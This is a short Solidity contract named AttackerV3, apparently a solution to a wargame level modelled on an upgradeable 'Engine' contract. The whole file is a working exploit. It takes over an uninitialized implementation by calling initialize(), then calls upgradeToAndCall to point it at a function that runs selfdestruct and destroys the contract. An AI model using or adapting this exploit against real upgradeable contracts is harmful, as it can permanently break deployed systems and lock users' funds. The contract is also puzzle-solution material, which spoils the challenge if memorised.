// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
    function upgrader() external view returns (address);
}

contract AttackerV3 {
    address public engine;
    
    constructor(address _engine) public {
        engine = _engine;
    }
    
    function attack() external {
        // First, initialize the Engine contract to become the upgrader
        IEngine(engine).initialize();
        
        // Now upgrade to a self-destructing implementation
        IEngine(engine).upgradeToAndCall(address(this), abi.encodeWithSignature("destroy()"));
    }
    
    function destroy() external {
        selfdestruct(address(0));
    }
}